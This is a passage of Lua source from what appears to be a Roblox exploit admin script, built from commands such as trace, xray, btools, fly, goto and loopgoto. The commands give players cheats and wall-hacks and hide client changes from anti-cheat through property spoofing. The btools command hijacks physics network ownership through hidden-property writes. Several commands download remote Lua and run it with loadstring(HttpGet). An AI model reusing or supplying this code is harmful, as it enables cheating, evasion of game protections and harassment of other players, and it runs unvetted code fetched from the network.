				local Humanoid = GetHumanoid();
				local Boomboxes = filter(GetChildren(LocalPlayer.Backpack), function(i, v)
					if (Sfind(lower(v.Name), "boombox") or FindFirstChildOfClass(v.Handle, "Sound", true)) then
						v.Parent = Character
						return true
					end
					return false
				end)
				for i = 1, #Boomboxes do
					local Boombox = Boomboxes[i]
					local RemoteEvent = FindFirstChildWhichIsA(Boombox, "RemoteEvent")
					RemoteEvent.FireServer(RemoteEvent, "PlaySong", AudioId);
				end
			end
		end
	end
end)

AddCommand("grippos", {}, "changes grippos of your tool", {"3"}, function(Caller, Args, CEnv)
	local Tool = FindFirstChildWhichIsA(GetCharacter(), "Tool") or FindFirstChildWhichIsA(LocalPlayer.Backpack, "Tool");
	if (Tool) then
		local GripPos = Vector3New(tonumber(Args[1]), tonumber(Args[2]), tonumber(Args[3]));
		if (Args[4]) then
			for i, v in next, tbl_concat(GetChildren(LocalPlayer.Backpack), GetChildren(LocalPlayer.Character)) do
				if (IsA(v, "Tool")) then
					SpoofProperty(Tool, "GripPos");
					Tool.GripPos = GripPos
				end
			end
		end
		SpoofProperty(Tool, "GripPos");
		Tool.GripPos = GripPos
		Tool.Parent = GetCharacter();
		return "Grippos set."
	else
		return "There isn't any tool to set grippos."
	end
	--return "Grippos set."
end)

AddCommand("truesightguis", {}, "true sight on all guis", {}, function(Caller, Args, CEnv)
	for i, v in next, GetDescendants(game) do
		if (IsA(v, "Frame") or IsA(v, "ScrollingFrame") and not v.Visible) then
			CEnv[v] = v.Visible
			SpoofProperty(v, "Visible");
			v.Visible = true
		end
	end
	Utils.Notify(Caller, "Truesightguis", "Enabled!")
end)

AddCommand("notruesightguis", {}, "removes truesight on guis", {}, function(Caller, Args)
	local Guis = LoadCommand("truesightguis").CmdEnv
	for i, v in next, Guis do
		i.Visible = v
	end
	Utils.Notify(Caller, "Truesightguis", "Disabled!")
end)

local EspLib;
AddCommand("trace", {"locate"}, "traces a player", {"1"}, function(Caller, Args, CEnv)
	if (not EspLib) then
		EspLib = loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/fatesc/fates-esp/main/esp-lib/esplibmain.lua"))();
	end
	local Target = GetPlayer(Args[1]);
	local New = EspLib.new
	for i, v in next, Target do
		New("Tracer", {
			Target = v
		});
		New("Text", {
			Target = v,
			ShowHealth = true,
			ShowDistance = true
		});
	end
	AddConnection(CConnect(Services.Players.PlayerRemoving, function(Plr)
		if (Tfind(Target, Plr)) then
			EspLib.Remove(v);
		end
	end), CEnv);
	return format("Now tracing %s", #Target == 1 and Target[1].Name or #Target .. " players");
end)

AddCommand("untrace", {"unlocate"}, "untraces a player", {"1"}, function(Caller, Args)
	if (not EspLib) then
		EspLib = loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/fatesc/fates-esp/main/esp-lib/esplibmain.lua"))();
	end
	local Target = GetPlayer(Args[1]);
	local Remove = EspLib.Remove
	for i, v in next, Target do
		Remove(v);
	end
	return format("Now stopped tracing %s", #Target == 1 and Target[1].Name or #Target .. " players");
end)

AddCommand("walkto", {}, "walks to a player", {"1", 3}, function(Caller, Args)
	local Target = GetPlayer(Args[1])[1];
	local Humanoid = GetHumanoid();
	Humanoid.MoveTo(Humanoid, GetRoot(Target).Position);
	return "Walking to " .. Target.Name
end)

AddCommand("follow", {}, "follows a player", {"1", 3}, function(Caller, Args, CEnv)
	local Target = GetPlayer(Args[1])[1]
	CEnv[Target.Name] = true
	CThread(function()
		repeat
			local Humanoid = GetHumanoid();
			Humanoid.MoveTo(Humanoid, GetRoot(Target).Position);
			wait(.2);
		until not LoadCommand("follow").CmdEnv[Target.Name]
	end)()
	return "Now following " .. Target.Name
end)

AddCommand("unfollow", {}, "unfollows a player", {}, function()
	local Following = LoadCommand("follow").CmdEnv
	if (not next(Following)) then
		return "you are not following anyone"
	end
	LoadCommand("follow").CmdEnv = {}
	return "Stopped following."
end)

AddCommand("age", {}, "ages a player", {"1"}, function(Caller, Args)
	local Target = GetPlayer(Args[1]);
	for i, v in next, Target do
		local AccountAge = v.AccountAge
		local t = os.date("*t", os.time());
		t.day = t.day - tonumber(AccountAge);
		local CreatedAt = os.date("%d/%m/%y", os.time(t));
		Utils.Notify(Caller, "Age", format("%s's age is %s (%s)", v.Name, AccountAge, CreatedAt));
	end
end)

AddCommand("hidesales", {"nosales"}, "no purchase prompt notifications will be shown", {}, function()
	local CoreGui = Services.CoreGui
	CoreGui.PurchasePrompt.Enabled = false
	Utils.Notify(Caller, "Hidesales", "Enabled!")
end)

AddCommand("showsales", {}, "purchase prompt notifications will be shown", {}, function()
	local CoreGui = Services.CoreGui
	CoreGui.PurchasePrompt.Enabled = true
	Utils.Notify(Caller, "Hidesales", "Disabled!")
end)

AddCommand("volume", {"vol"}, "changes your game volume", {}, function(Caller, Args)
	local Volume = tonumber(Args[1]);
	if (not Volume or Volume > 10 or Volume < 0) then
		return "Volume must be a number between 0-10.";
	end
	local UserSettings = UserSettings()
	UserSettings.GetService(UserSettings, "UserGameSettings").MasterVolume = Volume / 10
	return "Volume set to " .. Volume
end)

AddCommand("respawn", {"gr"}, "resets your character", {3}, function()
	if game:FindFirstChildOfClass("Players").LocalPlayer.Character.Humanoid.Health == 0 then
		local LP = game.Players.LocalPlayer
		local CHAR = LP.Character
		LP.Character = nil 
		LP.Character = CHAR
		local HRP = CHAR:FindFirstChild("HumanoidRootPart") 
		if HRP == nil then return end 
		HRP:Destroy()
		LP.CharacterAdded:Wait()
		Utils.Notify(Caller, "Respawn", "Respawned!")		
	else			
		local Player = game:FindFirstChildOfClass("Players").LocalPlayer
		local Character = Player.Character
		if Character:FindFirstChildOfClass("Humanoid") then Character:FindFirstChildOfClass("Humanoid"):ChangeState(15) end
		Player.Character:BreakJoints()
		Player.CharacterAdded:Wait()
		Utils.Notify(Caller, "Respawn", "Respawned!")
	end
end)

AddCommand("refresh", {"re"}, "refreshes your character", {3}, function(Caller)
	local Player = game:FindFirstChildOfClass("Players").LocalPlayer
	local Character = Player.Character
	local OldPos = Character.HumanoidRootPart.CFrame
	local BaseParts = filter(GetChildren(GetCharacter(v)), function(i, v)
		return IsA(v, "BasePart");
	end)
	for i, v in next, BaseParts do
		SpoofProperty(v, "Anchored");
		v.Anchored = true
	end
	if Character:FindFirstChildOfClass("Humanoid") then Character:FindFirstChildOfClass("Humanoid"):ChangeState(15) end
	Player.Character:BreakJoints()
	Player.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = OldPos
	Utils.Notify(Caller, "Refresh", "Refreshed!")
end)

AddCommand("newbubblechat", {}, "enables the new bubblechat on client", {}, function()
	local Chat = Services.Chat
	Chat.BubbleChatEnabled = true
	Utils.Notify(Caller, "BubbleChat", "Enabled!")
end)

AddCommand("oldbubblechat", {}, "disables the new bubblechat on client", {}, function()
	local Chat = Services.Chat
	Chat.BubbleChatEnabled = false
	Utils.Notify(Caller, "BubbleChat", "Disabled!")
end)

AddCommand("chatlogs", {"logs"}, "enables chatlogs", {}, function()
	local MessageClone = Clone(ChatLogs.Frame.List);

	Utils.ClearAllObjects(ChatLogs.Frame.List)
	ChatLogs.Visible = true

	local Tween = Utils.TweenAllTransToObject(ChatLogs, .25, ChatLogsTransparencyClone)

	Destroy(ChatLogs.Frame.List)
	MessageClone.Parent = ChatLogs.Frame

	for i, v in next, GetChildren(ChatLogs.Frame.List) do
		if (not IsA(v, "UIListLayout")) then
			Utils.Tween(v, "Sine", "Out", .25, {
				TextTransparency = 0
			})
		end
	end

	local ChatLogsListLayout = ChatLogs.Frame.List.UIListLayout

	CConnect(GetPropertyChangedSignal(ChatLogsListLayout, "AbsoluteContentSize"), function()
		local CanvasPosition = ChatLogs.Frame.List.CanvasPosition
		local CanvasSize = ChatLogs.Frame.List.CanvasSize
		local AbsoluteSize = ChatLogs.Frame.List.AbsoluteSize

		if (CanvasSize.Y.Offset - AbsoluteSize.Y - CanvasPosition.Y < 20) then
			wait() -- chatlogs updates absolutecontentsize before sizing frame
			ChatLogs.Frame.List.CanvasPosition = Vector2.new(0, CanvasSize.Y.Offset + 1000) --ChatLogsListLayout.AbsoluteContentSize.Y + 100)
		end
	end)

	Utils.Tween(ChatLogs.Frame.List, "Sine", "Out", .25, {
		ScrollBarImageTransparency = 0
	})
end)

AddCommand("controlnpc", {}, "makes you able to control every unanchored npc", {3}, function()

	local mouse = game.Players.LocalPlayer:GetMouse()
	local uis = game:GetService("UserInputService")

	mouse.Button1Down:Connect(function()

		if mouse.Target and uis:IsKeyDown(Enum.KeyCode.LeftControl) then
			local npc = mouse.target.Parent
			local npcRootPart = npc.HumanoidRootPart
			local PlayerCharacter = game:GetService("Players").LocalPlayer.Character
			local PlayerRootPart = PlayerCharacter.HumanoidRootPart
			local A0 = Instance.new("Attachment")
			local AP = Instance.new("AlignPosition")
			local AO = Instance.new("AlignOrientation")
			local A1 = Instance.new("Attachment")
			for _, v in pairs(npc:GetDescendants()) do
				if v:IsA("BasePart") then
					game:GetService("RunService").Stepped:Connect(function()
						v.CanCollide = false
					end)
				end
			end
			PlayerRootPart:BreakJoints()
			for _, v in pairs(PlayerCharacter:GetDescendants()) do
				if v:IsA("BasePart") then
					if v.Name == "HumanoidRootPart" or v.Name == "UpperTorso" or v.Name == "Head" then
					else
						v:Destroy()
					end
				end
			end
			PlayerRootPart.Position = PlayerRootPart.Position+Vector3.new(5, 0, 0)
			PlayerCharacter.Head.Anchored = true
			PlayerCharacter.UpperTorso.Anchored = true
			A0.Parent = npcRootPart
			AP.Parent = npcRootPart
			AO.Parent = npcRootPart
			AP.Responsiveness = 200
			AP.MaxForce = math.huge
			AO.MaxTorque = math.huge
			AO.Responsiveness = 200
			AP.Attachment0 = A0
			AP.Attachment1 = A1
			AO.Attachment1 = A1
			AO.Attachment0 = A0
			A1.Parent = PlayerRootPart
		end
	end)
end)

AddCommand("f3x", {}, "gives f3x item", {}, function()
	loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
end)

AddCommand("btools", {}, "gives you btools for accessories", {3}, function(Caller, Args)	

	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local LocalPlayer = Players.LocalPlayer

	if not getgenv().Network then
		getgenv().Network = {
			BaseParts = {};
			FakeConnections = {};
			Connections = {};
			Output = {
				Enabled = true;
				Prefix = "[NETWORK] ";
				Send = function(Type,Output,BypassOutput)
					if typeof(Type) == "function" and (Type == print or Type == warn or Type == error) and typeof(Output) == "string" and (typeof(BypassOutput) == "nil" or typeof(BypassOutput) == "boolean") then
						if Network["Output"].Enabled == true or BypassOutput == true then
							Type(Network["Output"].Prefix..Output);
						end;
					elseif Network["Output"].Enabled == true then
						error(Network["Output"].Prefix.."Output Send Error : Invalid syntax.");
					end;
				end;
			};
			CharacterRelative = false;
		}

		Network["Output"].Send(print,": Loading.")
		Network["Velocity"] = Vector3.new(14.46262424,14.46262424,14.46262424); --exactly 25.1 magnitude
		Network["RetainPart"] = function(Part,ReturnFakePart) --function for retaining ownership of unanchored parts
			assert(typeof(Part) == "Instance" and Part:IsA("BasePart") and Part:IsDescendantOf(workspace),Network["Output"].Prefix.."RetainPart Error : Invalid syntax: Arg1 (Part) must be a BasePart which is a descendant of workspace.")
			assert(typeof(ReturnFakePart) == "boolean" or typeof(ReturnFakePart) == "nil",Network["Output"].Prefix.."RetainPart Error : Invalid syntax: Arg2 (ReturnFakePart) must be a boolean or nil.")
			if not table.find(Network["BaseParts"],Part) then
				if Network.CharacterRelative == true then
					local Character = LocalPlayer.Character
					if Character and Character.PrimaryPart then
						local Distance = (Character.PrimaryPart.Position-Part.Position).Magnitude
						if Distance > 1000 then
							Network["Output"].Send(warn,"RetainPart Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as it is more than "..gethiddenproperty(LocalPlayer,"MaximumSimulationRadius").." studs away.")
							return false
						end
					else
						Network["Output"].Send(warn,"RetainPart Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as the LocalPlayer Character's PrimaryPart does not exist.")
						return false
					end
				end
				table.insert(Network["BaseParts"],Part)
				Part.CustomPhysicalProperties = PhysicalProperties.new(0,0,0,0,0)
				Network["Output"].Send(print,"PartOwnership Output : PartOwnership applied to BasePart "..Part:GetFullName()..".")
				if ReturnFakePart == true then
					return FakePart
				end
			else
				Network["Output"].Send(warn,"RetainPart Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as it already active.")
				return false
			end
		end

		Network["RemovePart"] = function(Part) --function for removing ownership of unanchored part
			assert(typeof(Part) == "Instance" and Part:IsA("BasePart"),Network["Output"].Prefix.."RemovePart Error : Invalid syntax: Arg1 (Part) must be a BasePart.")
			local Index = table.find(Network["BaseParts"],Part)
			if Index then
				table.remove(Network["BaseParts"],Index)
				Network["Output"].Send(print,"RemovePart Output: PartOwnership removed from BasePart "..Part:GetFullName()..".")
			else
				Network["Output"].Send(warn,"RemovePart Warning : BasePart "..Part:GetFullName().." not found in BaseParts table.")
			end
		end

		Network["SuperStepper"] = Instance.new("BindableEvent") --make super fast event to connect to
		for _,Event in pairs({RunService.Stepped,RunService.Heartbeat}) do
			Event:Connect(function()
				return Network["SuperStepper"]:Fire(Network["SuperStepper"],tick())
			end)
		end

		Network["PartOwnership"] = {};
		Network["PartOwnership"]["PreMethodSettings"] = {};
		Network["PartOwnership"]["Enabled"] = false;
		Network["PartOwnership"]["Enable"] = coroutine.create(function() --creating a thread for network stuff
			if Network["PartOwnership"]["Enabled"] == false then
				Network["PartOwnership"]["Enabled"] = true --do cool network stuff before doing more cool network stuff
				Network["PartOwnership"]["PreMethodSettings"].ReplicationFocus = LocalPlayer.ReplicationFocus
				LocalPlayer.ReplicationFocus = workspace
				Network["PartOwnership"]["PreMethodSettings"].SimulationRadius = gethiddenproperty(LocalPlayer,"SimulationRadius")
				Network["PartOwnership"]["Connection"] = Network["SuperStepper"].Event:Connect(function() --super fast asynchronous loop
					sethiddenproperty(LocalPlayer,"SimulationRadius",1/0)
					for _,Part in pairs(Network["BaseParts"]) do --loop through parts and do network stuff
						coroutine.wrap(function()
							if Part:IsDescendantOf(workspace) then
								if Network.CharacterRelative == true then
									local Character = LocalPlayer.Character;
									if Character and Character.PrimaryPart then
										local Distance = (Character.PrimaryPart.Position - Part.Position).Magnitude
										if Distance > 1000 then
											Network["Output"].Send(warn,"PartOwnership Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as it is more than "..gethiddenproperty(LocalPlayer,"MaximumSimulationRadius").." studs away.")
											Lost = true;
											Network["RemovePart"](Part)
										end
									else
										Network["Output"].Send(warn,"PartOwnership Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as the LocalPlayer Character's PrimaryPart does not exist.")
									end
								end
								Part.Velocity = Network["Velocity"]+Vector3.new(0,math.cos(tick()*10)/100,0) --keep network by sending physics packets of 30 magnitude + an everchanging addition in the y level so roblox doesnt get triggered and fuck your ownership
							else
								Network["RemovePart"](Part)
							end
						end)()
					end
				end)
				Network["Output"].Send(print,"PartOwnership Output : PartOwnership enabled.")
			else
				Network["Output"].Send(warn,"PartOwnership Output : PartOwnership already enabled.")
			end
		end)
		Network["PartOwnership"]["Disable"] = coroutine.create(function()
			if Network["PartOwnership"]["Connection"] then
				Network["PartOwnership"]["Connection"]:Disconnect()
				LocalPlayer.ReplicationFocus = Network["PartOwnership"]["PreMethodSettings"].ReplicationFocus
				sethiddenproperty(LocalPlayer,"SimulationRadius",Network["PartOwnership"]["PreMethodSettings"].SimulationRadius)
				Network["PartOwnership"]["PreMethodSettings"] = {}
				for _,Part in pairs(Network["BaseParts"]) do
					Network["RemovePart"](Part)
				end
				Network["PartOwnership"]["Enabled"] = false
				Network["Output"].Send(print,"PartOwnership Output : PartOwnership disabled.")
			else
				Network["Output"].Send(warn,"PartOwnership Output : PartOwnership already disabled.")
			end
		end)
		Network["Output"].Send(print,": Loaded.")
	end

	coroutine.resume(Network["PartOwnership"]["Enable"])

	player = game:GetService("Players").LocalPlayer

	char = player.Character
	char.Archivable = true

	fake = char:Clone()
	fake.Parent = workspace
	fake.HumanoidRootPart.CFrame = CFrame.new(0, math.huge, 0)

	player.Character = nil 
	player.Character = fake

	wait(game.Players.RespawnTime + .3) 

	char.Humanoid.Health = 0

	Gui = player.PlayerGui
	Backpack = player.Backpack
	Mouse = player:GetMouse()

	Parts_Folder = Instance.new("Folder",workspace)

	for i,v in pairs(char:GetChildren()) do
		if v:IsA("Accessory") then
			local Part = Instance.new("Part",Parts_Folder)
			Part.Name = v.Name
			Part.Anchored = true
			Part.Size = v.Handle.Size - Vector3.new(0.001,0.001,0.001)
			Part.Position = char.Head.Position + Vector3.new(math.random(-5,5),math.random(-1,1),math.random(-5,5))
			Part:SetAttribute("Moveable",true)
			Part.Material = Enum.Material.SmoothPlastic
			Part.CanCollide = false
			Part.Color = Color3.new(1,0,0)
			Part.Transparency = 1
			local obj = Instance.new("ObjectValue",Part)
			obj.Name = "hat"
			obj.Value = v.Handle

			local Hat = v.Handle
			Network.RetainPart(Hat)
			Hat.CustomPhysicalProperties = PhysicalProperties.new(0,0,0,0,0)
			coroutine.wrap(function()
				while Hat:FindFirstAncestor("Game") do
					Hat.CFrame = Part.CFrame
					task.wait()
				end
				player.Character = char
			end)()
		end
	end


	Move_Tool = Instance.new("Tool",Backpack)
	Rotate_Tool = Instance.new("Tool",Backpack)
	MHandle = Instance.new("Part",Move_Tool)
	RHandle = Instance.new("Part",Rotate_Tool)
	Mgrabs = Instance.new("Handles",Gui)
	Rgrabs = Instance.new("ArcHandles",Gui)
	Outline = Instance.new("Highlight")

	Move_Tool.Name = "Move"
	Move_Tool.CanBeDropped = false

	Rotate_Tool.Name = "Rotate"
	Rotate_Tool.CanBeDropped = false

	MHandle.Name = "Handle"
	MHandle.Transparency = 1

	RHandle.Name = "Handle"
	RHandle.Transparency = 1

	Mgrabs.Visible = false
	Mgrabs.Color3 = Color3.new(1, 0.8, 0)
	Mgrabs.Style = "Movement"

	Rgrabs.Visible = false

	Outline.FillTransparency = 1
	Outline.OutlineTransparency = 0
	Outline.OutlineColor = Color3.new(1, 0.8, 0)

	Active_Part = nil

	Move_Tool.AncestryChanged:Connect(function()
		if Move_Tool.Parent == fake and Active_Part ~= nil then
			Mgrabs.Visible = true
			Mgrabs.Adornee = Active_Part
		end
	end)

	Move_Tool.AncestryChanged:Connect(function()
		if Move_Tool.Parent ~= fake then
			Mgrabs.Visible = false
			Mgrabs.Adornee = nil
		end
	end)

	Mouse.Button1Down:Connect(function()
		if Move_Tool.Parent == fake and Mouse.Target:GetAttribute("Moveable") then
			Active_Part = Mouse.Target
			Mgrabs.Visible = true
			Mgrabs.Adornee = Active_Part
			Outline.Parent = Active_Part.hat.Value
		end
		if Rotate_Tool.Parent == fake and Mouse.Target:GetAttribute("Moveable") then
			Active_Part = Mouse.Target
			Rgrabs.Visible = true
			Rgrabs.Adornee = Active_Part
			Outline.Parent = Active_Part.hat.Value
		end
	end)

	Rotate_Tool.AncestryChanged:Connect(function()
		if Rotate_Tool.Parent == fake and Active_Part ~= nil then
			Rgrabs.Visible = true
			Rgrabs.Adornee = Active_Part
		end
	end)

	Rotate_Tool.AncestryChanged:Connect(function()
		if Rotate_Tool.Parent ~= fake then
			Rgrabs.Visible = false
			Rgrabs.Adornee = nil
		end
	end)

	MOGCFrame = CFrame.new()

	Mgrabs.MouseButton1Down:Connect(function()
		MOGCFrame = Active_Part.CFrame
	end)

	Mgrabs.MouseDrag:Connect(function(knob, pos)
		if knob == Enum.NormalId.Front then
			Active_Part.CFrame = MOGCFrame + MOGCFrame.LookVector * pos
		end
		if knob == Enum.NormalId.Back then
			Active_Part.CFrame = MOGCFrame + MOGCFrame.LookVector * -pos
		end
		if knob == Enum.NormalId.Top then
			Active_Part.CFrame = MOGCFrame + MOGCFrame.UpVector * pos
		end
		if knob == Enum.NormalId.Bottom then
			Active_Part.CFrame = MOGCFrame + MOGCFrame.UpVector * -pos
		end
		if knob == Enum.NormalId.Left then
			Active_Part.CFrame = MOGCFrame + MOGCFrame.RightVector * -pos
		end
		if knob == Enum.NormalId.Right then
			Active_Part.CFrame = MOGCFrame + MOGCFrame.RightVector * pos
		end
	end)

	ROGCFrame = CFrame.new()

	Rgrabs.MouseButton1Down:Connect(function()
		ROGCFrame = Active_Part.CFrame
	end)

	Rgrabs.MouseDrag:Connect(function(knob, angle)
		if knob == Enum.Axis.Y then
			Active_Part.CFrame = ROGCFrame * CFrame.Angles(0,angle,0)
		end
		if knob == Enum.Axis.X then
			Active_Part.CFrame = ROGCFrame * CFrame.Angles(angle,0,0)
		end
		if knob == Enum.Axis.Z then
			Active_Part.CFrame = ROGCFrame * CFrame.Angles(0,0,angle)
		end
	end)

	Mouse.TargetFilter = char

	camera = workspace.CurrentCamera
	input = game:GetService("UserInputService")

	Camera_Part = Instance.new("Part",workspace)
	Camera_Part.Anchored = true
	Camera_Part.Transparency = 0.85
	Camera_Part.Shape = Enum.PartType.Ball
	Camera_Part.Size = Vector3.new(0.5,0.5,0.5)
	Camera_Part.Material = Enum.Material.SmoothPlastic

	current_position = char.Head.Position

	camera.CameraSubject = Camera_Part

	game:GetService("StarterGui"):SetCore("SendNotification",{
		Title = "FE BTools Loaded",
		Text = "Made by rouxhaver",
		Icon = "rbxassetid://12997341656"
	})
	game:GetService("StarterGui"):SetCore("SendNotification",{
		Title = "Network Credit:",
		Text = "thanks to 4eyes for network stuff",
		Icon = "rbxassetid://12997341656"
	})
	while wait() do
		if input:IsKeyDown(Enum.KeyCode.D) then
			current_position += camera.CFrame.RightVector * speed
		end
		if input:IsKeyDown(Enum.KeyCode.A) then
			current_position += camera.CFrame.RightVector * -speed
		end
		if input:IsKeyDown(Enum.KeyCode.W) then
			current_position += camera.CFrame.LookVector * speed
		end
		if input:IsKeyDown(Enum.KeyCode.S) then
			current_position += camera.CFrame.LookVector * -speed
		end
		if input:IsKeyDown(Enum.KeyCode.E) then
			current_position += camera.CFrame.UpVector * speed
		end
		if input:IsKeyDown(Enum.KeyCode.Q) then
			current_position += camera.CFrame.UpVector * -speed
		end
		if input:IsKeyDown(Enum.KeyCode.LeftShift) then do
				speed = 1.5
			end else
			speed = 0.75
		end
		Camera_Part.Position = current_position
	end
end)

AddCommand("spin", {}, "spins your character (optional: speed)", {}, function(Caller, Args, CEnv)
	local Speed = Args[1] or 5
	if (not CEnv[1]) then
		local Spin = InstanceNew("BodyAngularVelocity");
		ProtectInstance(Spin);
		Spin.Parent = GetRoot();
		Spin.MaxTorque = Vector3New(0, math.huge, 0);
		Spin.AngularVelocity = Vector3New(0, Speed, 0);
		CEnv[#CEnv + 1] = Spin
	else
		CEnv[1].AngularVelocity = Vector3New(0, Speed, 0);
	end
	return "Started spinning."
end)

AddCommand("unspin", {}, "unspins your character", {}, function(Caller, Args)
	local Spinning = LoadCommand("spin").CmdEnv
	for i, v in next, Spinning do
		Destroy(v);
	end
	LoadCommand("spin").CmdEnv = {}
	Utils.Notify(Caller, "Spin", "Disabled!")
end)

AddCommand("goto", {"to"}, "teleports yourself to the other character", {3, "1"}, function(Caller, Args)
	local Target = GetPlayer(Args[1]);
	local Delay = tonumber(Args[2]);
	for i, v in next, Target do
		if (Delay) then
			wait(Delay);
		end
		if (Caller ~= LocalPlayer) then
			ExecuteCommand("bring", {Caller.Name, v.Name}, LocalPlayer)
		else
			GetRoot().CFrame = GetRoot(v).CFrame * CFrameNew(-3.5, 0, 0);
		end
	end
end)

AddCommand("loopgoto", {"loopto"}, "loop teleports yourself to the other character", {3, "1"}, function(Caller, Args, CEnv)
	local Target = GetPlayer(Args[1])[1]
	local Connection = CConnect(Heartbeat, function()
		GetRoot().CFrame = GetRoot(Target).CFrame * CFrameNew(0, 0, 2);
	end)

	CEnv[Target.Name] = Connection
	AddPlayerConnection(LocalPlayer, Connection);
	AddConnection(Connection);
	return "Now looping to " .. Target.name
end)

AddCommand("unloopgoto", {"unloopto"}, "removes loop teleportation to the other character", {}, function(Caller)
	local Looping = LoadCommand("loopgoto").CmdEnv;
	if (not next(Looping)) then
		return "you aren't loop teleporting to anyone"
	end
	DisableAllCmdConnections("loopgoto");
	return "Loopgoto disabled."
end)

AddCommand("tweento", {"tweengoto"}, "tweens yourself to the other person", {3, "1"}, function(Caller, Args)
	local Target = GetPlayer(Args[1]);
	local TweenService = Services.TweenService
	local Create = TweenService.Create
	for i, v in next, Target do
		local Tween = Create(TweenService, GetRoot(), TweenInfo.new(2), {CFrame = GetRoot(v).CFrame})
		Tween.Play(Tween);
	end
end)

AddCommand("truesight", {}, "shows all the transparent stuff", {}, function(Caller, Args, CEnv)
	local amount = 0
	local time = tick();
	for i, v in next, GetDescendants(Services.Workspace) do
		if (IsA(v, "Part") and v.Transparency >= 0.3) then
			CEnv[v] = v.Transparency
			SpoofProperty(v, "Transparency");
			v.Transparency = 0
			amount = amount + 1
		end
	end
	return format("%d items shown in %.3f (s)", amount, (tick()) - time);
end)

AddCommand("notruesight", {"nots"}, "removes truesight", {}, function(Caller, Args)
	local showing = LoadCommand("truesight").CmdEnv
	local time = tick();
	for i, v in next, showing do
		i.Transparency = v
	end
	return format("%d items hidden in %.3f (s)", #showing, (tick()) - time);
end)

AddCommand("xray", {}, "see through wallks", {}, function(Caller, Args, CEnv)
	for i, v in next, GetDescendants(Services.Workspace) do
		if IsA(v, "Part") and v.Transparency <= 0.3 then
			CEnv[v] = v.Transparency
			SpoofProperty(v, "Transparency");
			v.Transparency = 0.3
		end
	end
	Utils.Notify(Caller, "Xray", "Enabled!")
end)

AddCommand("noxray", {"unxray"}, "stops xray", {}, function(Caller, Args)
	local showing = LoadCommand("xray").CmdEnv
	local time = tick();
	for i, v in next, showing do
		i.Transparency = v
	end
	Utils.Notify(Caller, "Xray", "Disabled!")
end)

AddCommand("removelights", {"nolights"}, "removes all lights", {}, function(Caller, Args, CEnv)	
	for i, v in next, GetDescendants(game) do
		if (IsA(v, "PointLight") or IsA(v, "SurfaceLight") or IsA(v, "SpotLight")) then
			CEnv[v] = v.Parent
			v.Parent = nil
		end
	end
	Lighting.GlobalShadows = true
	Utils.Notify(Caller, "Lights", "Removed!")
end)

AddCommand("revertnolights", {"lights"}, "reverts nolights", {}, function()
	local Lights = LoadCommand("nolights").CmdEnv
	for i, v in next, Lights do
		i.Parent = v
	end
	Utils.Notify(Caller, "Lights", "Reverted lights!")
end)

AddCommand("fullbright", {"fb"}, "turns on fullbright", {}, function(Caller, Args, CEnv)
	local Lighting = Services.Lighting
	Lighting.Brightness = 2
	Lighting.ClockTime = 14
	Lighting.FogEnd = 100000
	Lighting.GlobalShadows = false
	Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)	
	Utils.Notify(Caller, "Fullbright", "Enabled!")
end)

AddCommand("nofullbright", {"unfb"}, "reverts fullbright", {}, function()
	local Lighting = Services.Lighting
	local Lights = LoadCommand("fullbright").CmdEnv
	for i, v in next, Lights do
		i.Range = v
	end
	Lighting.GlobalShadows = true
	Utils.Notify(Caller, "Fullbright", "Disabled!")
end)

AddCommand("swim", {}, "allows you to use the swim state", {3}, function(Caller, Args, CEnv)
	local Humanoid = GetHumanoid();
	SpoofInstance(Humanoid);
	for i, v in next, Enum.HumanoidStateType.GetEnumItems(Enum.HumanoidStateType) do
		SetStateEnabled(Humanoid, v, false);
	end
	CEnv[1] = GetState(Humanoid);
	ChangeState(Humanoid, Enum.HumanoidStateType.Swimming);
	SpoofProperty(Services.Workspace, "Gravity");
	Services.Workspace.Gravity = 0
	CThread(function()
		CWait(Humanoid.Died);
		Services.Workspace.Gravity = 198
	end)()
	Utils.Notify(Caller, "Swim", "Enabled!")
end)

AddCommand("unswim", {"noswim"}, "removes swim", {}, function(Caller, Args)
	local Humanoid = GetHumanoid();
	for i, v in next, Enum.HumanoidStateType.GetEnumItems(Enum.HumanoidStateType) do
		SetStateEnabled(Humanoid, v, true);
	end
	ChangeState(Humanoid, LoadCommand("swim").CmdEnv[1]);
	Services.Workspace.Gravity = 198
	Utils.Notify(Caller, "Swim", "Disabled!")
end)

AddCommand("disableanims", {"noanims"}, "disables character animations", {3}, function(Caller, Args)
	local Animate = FindFirstChild(GetCharacter(), "Animate");
	SpoofProperty(Animate, "Disabled");
	Animate.Disabled = true
	Utils.Notify(Caller, "Disableanims", "Enabled!")
end)

AddCommand("enableanims", {"anims"}, "enables character animations", {3}, function(Caller, Args)
	FindFirstChild(GetCharacter(), "Animate").Disabled = false
	Utils.Notify(Caller, "Disableanims", "Disabled!")
end)

AddCommand("fly", {}, "fly your character", {3}, function(Caller, Args, CEnv)

	local Speed = GetConfig().FlySpeed
	for i, v in next, GetChildren(GetRoot()) do
		if (IsA(v, "BodyPosition") or IsA(v, "BodyGyro")) then
			Destroy(v);
		end
	end
	local BodyPos = InstanceNew("BodyPosition");
	local BodyGyro = InstanceNew("BodyGyro");
	ProtectInstance(BodyPos);
	ProtectInstance(BodyGyro);
	SpoofProperty(GetHumanoid(), "FloorMaterial");
	SpoofProperty(GetHumanoid(), "PlatformStand");
	BodyPos.Parent = GetRoot();
	BodyGyro.Parent = GetRoot();
	BodyGyro.maxTorque = Vector3New(1, 1, 1) * 9e9
	BodyGyro.CFrame = GetRoot().CFrame
	BodyPos.maxForce = Vector3New(1, 1, 1) * math.huge
	GetHumanoid().PlatformStand = true
	CThread(function()
		BodyPos.Position = GetRoot().Position
		while wait() do
			Speed = GetConfig().FlySpeed
			local NewPos = (BodyGyro.CFrame - (BodyGyro.CFrame).Position) + BodyPos.Position
			local CoordinateFrame = Camera.CoordinateFrame
			if (Keys["W"]) then
				NewPos = NewPos + CoordinateFrame.lookVector * Speed

				BodyPos.Position = (GetRoot().CFrame * CFrameNew(0, 0, -Speed)).Position;
